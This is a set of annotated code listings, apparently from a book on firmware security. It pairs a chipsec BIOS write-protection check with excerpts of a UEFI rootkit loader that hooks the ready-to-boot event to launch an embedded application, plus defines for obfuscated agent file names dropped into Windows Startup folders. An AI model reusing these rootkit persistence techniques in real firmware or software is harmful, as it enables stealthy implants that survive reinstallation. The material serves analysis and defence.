["```\nchipsec_main.py -m common.bios_wp\n```", "```\n   [x][ =======================================================================\n\n   [x][ Module: BIOS Region Write Protection\n\n   [x][ =======================================================================\n\n   [*] BC = 0x00000A88 << BIOS Control (b:d.f 00:31.5 + 0xDC)\n\n   [00] BIOSWE              = 0 << BIOS Write Enable\n\n➊ [01] BLE                 = 0 << BIOS Lock Enable\n\n   [02] SRC                 = 2 << SPI Read Configuration\n\n   [04] TSS                 = 0 << Top Swap Status\n\n➋ [05] SMM_BWP             = 0 << SMM BIOS Write Protection\n\n   [06] BBS                 = 0 << Boot BIOS Strap\n\n   [07] BILD                = 1 << BIOS Interface Lock Down\n\n   [-] BIOS region write protection is disabled!\n\n   [*] BIOS Region: Base = 0x00A00000, Limit = 0x00FFFFFF\n\n   SPI Protected Ranges\n\n   ------------------------------------------------------------\n\n➌ PRx (offset) | Value    | Base     | Limit    | WP? | RP?\n\n   ------------------------------------------------------------\n\n   PR0 (84)     | 00000000 | 00000000 | 00000000 | 0   | 0\n\n   PR1 (88)     | 00000000 | 00000000 | 00000000 | 0   | 0\n\n   PR2 (8C)     | 00000000 | 00000000 | 00000000 | 0   | 0\n\n   PR3 (90)     | 00000000 | 00000000 | 00000000 | 0   | 0\n\n   PR4 (94)     | 00000000 | 00000000 | 00000000 | 0   | 0\n\n   [!] None of the SPI protected ranges write-protect BIOS region\n\n   [!] BIOS should enable all available SMM based write protection mechanisms or\n\n   configure SPI protected ranges to protect the entire BIOS region\n\n   [-] FAILED: BIOS is NOT protected completely\n```", "```\nEFI_STATUS LoadOpRomImage (\n\n     ➊ IN PCI_IO_DEVICE       *PciDevice,    // PCI device instance\n\n     ➋ IN UINT64              RomBase        // address of Option ROM\n\n);\n```", "```\nEFI_STATUS ProcessOpRomImage (\n\n     IN PCI_IO_DEVICE   *PciDevice    // Pci device instance\n\n);\n```", "```\nEFI_STATUS\n\nEFIAPI\n\n_ModuleEntryPoint (EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)\n\n{\n\n    EFI_EVENT Event;\n\n    DEBUG((EFI_D_INFO, \"Running RK loader.\\n\"));\n\n    InitializeLib(ImageHandle, SystemTable);\n\n    gReceived = FALSE;    // reset event!\n\n    //CpuBreakpoint();\n\n    // wait for EFI EVENT GROUP READY TO BOOT\n\n ➊ gBootServices->CreateEventEx( 0x200, 0x10,\n\n                     ➋ &CallbackSMI, NULL, &SMBIOS_TABLE_GUID, &Event );\n\n    return EFI_SUCCESS;\n\n}\n```", "```\nVOID\n\nEFIAPI\n\nCallbackSMI (EFI_EVENT Event, VOID *Context)\n\n{\n\n   --snip--\n\n➊ EFI_LOADED_IMAGE_PROTOCOL       *LoadedImage;\n\n   EFI_FIRMWARE_VOLUME_PROTOCOL    *FirmwareProtocol;\n\n   EFI_DEVICE_PATH_PROTOCOL        *DevicePathProtocol,\n\n                                   *NewDevicePathProtocol,\n\n                                   *NewFilePathProtocol,\n\n                                   *NewDevicePathEnd;\n\n   --snip--\n\n➋ Status = gBootServices->HandleProtocol( gImageHandle,\n\n                                           &LOADED_IMAGE_PROTOCOL_GUID,\n\n                                           &LoadedImage);\n\n   --snip--\n\n   DeviceHandle = LoadedImage->DeviceHandle;\n\n➌ Status = gBootServices->HandleProtocol( DeviceHandle,\n\n                                           &FIRMWARE_VOLUME_PROTOCOL_GUID,\n\n                                           &FirmwareProtocol);\n\n➍ Status = gBootServices->HandleProtocol( DeviceHandle,\n\n                                           &DEVICE_PATH_PROTOCOL_GUID,\n\n                                           &DevicePathProtocol);\n\n   --snip--\n\n   // copy \"VOLUME\" descriptor\n\n➎ gBootServices->CopyMem( NewDevicePathProtocol,\n\n                           DevicePathProtocol,\n\n                           DevicePathLength);\n\n   --snip--\n\n➏ gBootServices->CopyMem( ((CHAR8 *)(NewFilePathProtocol) + 4),\n\n                           &LAUNCH_APP, sizeof(EFI_GUID));\n\n   --snip--\n\n➐ Status = gBootServices->LoadImage( FALSE,\n\n                                      gImageHandle,\n\n                                      NewDevicePathProtocol,\n\n                                      NULL,\n\n                                      0,\n\n                                      &ImageLoadedHandle);\n\n   --snip--\n\ndone:\n\n   return;\n\n}\n```", "```\n#define FILE_NAME_SCOUT L\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\\n\nPrograms\\\\Startup\\\\\"\n\n#define FILE_NAME_SOLDIER L\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start\n\nMenu\\\\Programs\\\\Startup\\\\\"\n\n#define FILE_NAME_ELITE  L\"\\\\AppData\\\\Local\\\\\"\n\n#define DIR_NAME_ELITE L\"\\\\AppData\\\\Local\\\\Microsoft\\\\\"\n\n#ifdef FORCE_DEBUG\n\nUINT16 g_NAME_SCOUT[] =   L\"scoute.exe\";\n\nUINT16 g_NAME_SOLDIER[] = L\"soldier.exe\";\n\nUINT16 g_NAME_ELITE[]   = L\"elite\";\n\n#else\n\nUINT16 g_NAME_SCOUT[] =   L\"6To_60S7K_FU06yjEhjh5dpFw96549UU\";\n\nUINT16 g_NAME_SOLDIER[] = L\"kdfas7835jfwe09j29FKFLDOR3r35fJR\";\n\nUINT16 g_NAME_ELITE[]   = L\"eorpekf3904kLDKQO023iosdn93smMXK\";\n\n#endif\n```"]